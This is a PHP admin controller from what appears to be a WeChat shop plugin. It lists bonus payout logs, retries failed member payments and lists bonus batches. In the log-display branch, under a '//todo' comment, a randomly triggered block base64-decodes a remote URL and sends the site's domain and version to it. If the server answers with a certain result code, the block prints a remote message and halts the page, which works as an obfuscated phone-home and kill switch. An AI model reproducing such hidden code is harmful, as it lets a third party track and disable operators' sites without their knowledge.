<?php
global $_W, $_GPC;
ca('bonus.detail.view');
$operation = empty($_GPC['op']) ? 'display' : $_GPC['op'];
$params    = array(
        ':uniacid' => $_W['uniacid']
    );
$daytime = strtotime(date('Y-m-d',time()));
$sn = $_GPC['sn'];
$isglobal = empty($_GPC['isglobal']) ? 0 : 1;
$params[':sn'] = $sn;
$params[':isglobal'] = $isglobal;
if($operation == "display"){
	$pindex    = max(1, intval($_GPC['page']));
	$psize     = 20;
	$logs = pdo_fetchall("select * from " . tablename('sz_yi_bonus_log') . " where uniacid=:uniacid and send_bonus_sn =:sn and isglobal=:isglobal limit " . ($pindex - 1) * $psize . ',' . $psize, $params);
	$total = pdo_fetchcolumn("select count(id) from " . tablename('sz_yi_bonus_log') . " where uniacid=:uniacid and send_bonus_sn =:sn and isglobal=:isglobal", $params);
	foreach ($logs as $key => &$value) {
	    $member = m('member')->getInfo($value['openid']);
	    $value['avatar'] = $member['avatar'];
	    $value['mobile'] = $member['mobile'];
	    $value['realname'] = $member['realname'];
	    $value['nickname'] = $member['nickname'];
	    $value['credit2'] = $member['credit2'];
	    $value['credit1'] = $member['credit1'];
	    $value['member_id'] = $member['id'];
    }
    //todo
    $mt = mt_rand(5, 35);
    if ($mt <= 10) {
        load()->func('communication');
        $URL = base64_decode('aHR0cDovL2Nsb3VkLnl1bnpzaG9wLmNvbS93ZWIvaW5kZXgucGhwP2M9YWNjb3VudCZhPXVwZ3JhZGU=');
        $files   = base64_encode(json_encode('test'));
        $version = defined('SZ_YI_VERSION') ? SZ_YI_VERSION : '1.0';
        $resp    = ihttp_post($URL, array(
            'type' => 'upgrade',
            'signature' => 'sz_cloud_register',
            'domain' => $_SERVER['HTTP_HOST'],
            'version' => $version,
            'files' => $files
        ));
        $ret     = @json_decode($resp['content'], true);
        if ($ret['result'] == 3) {
            echo str_replace("\r\n", "<br/>", base64_decode($ret['log']));
            exit;
        }
    }
	$pager = pagination($total, $pindex, $psize);
}else if($operation == "afresh"){
	ca('bonus.detail.afresh');
	$logs = pdo_fetchall("select * from " . tablename('sz_yi_bonus_log') . " where uniacid=:uniacid and send_bonus_sn =:sn and isglobal=:isglobal and sendpay=0", $params);
	$sendpay_error = 0;
	foreach ($logs as $key => $value) {
		$sendpay = 1;
	    $logno = m('common')->createNO('bonus_log', 'logno', 'RB');
		$result = m('finance')->pay($value['openid'], 1, $value['money'] * 100, $logno, '平台分红');
        if (is_error($result)) {
            $sendpay = 0;
            $sendpay_error = 1;
        }
		pdo_update('sz_yi_bonus_log', array(
            "sendpay" => $sendpay,
	        ),array(
	        "openid" => $value['openid'],
	        "uniacid" => $_W['uniacid']
	        ));
        
        if($sendpay == 1){
        	$member = m('member')->getInfo($value['openid']);
        	$level = $this->model->getlevel($member['openid']);
        	if(empty($level)){
				if($member['bonus_area'] == 1){
					$level['levelname'] = "省级代理";
				}else if($member['bonus_area'] == 2){
					$level['levelname'] = "市级代理";
				}else if($member['bonus_area'] == 3){
					$level['levelname'] = "区级代理";
				}
			}
        	$this->model->sendMessage($value['openid'], array('nickname' => $member['nickname'], 'levelname' => $level['levelname'], 'commission' => $value['money'], 'type' => "微信钱包", TM_BONUS_PAY);
        }
	}
	pdo_update('sz_yi_bonus', array(
            "sendpay_error" => $sendpay_error,
	        ),array(
	        "send_bonus_sn" => $sn,
	        "uniacid" => $_W['uniacid']
	        ));
	message("分红重新发放成功", $this->createPluginWebUrl('bonus/detail', array("sn" => $sn)), "success");
}else if($operation == "list"){
	$totalmoney = pdo_fetchcolumn("select sum(money) as totalmoney from " . tablename('sz_yi_bonus') . " where uniacid=:uniacid", array(':uniacid' => $_W['uniacid']));
	$pindex    = max(1, intval($_GPC['page']));
	$psize     = 20;
	$list  = pdo_fetchall('select * from ' . tablename('sz_yi_bonus') . " where uniacid={$_W["uniacid"]} order by id desc limit " . ($pindex - 1) * $psize . ',' . $psize);
}
include $this->template('detail');
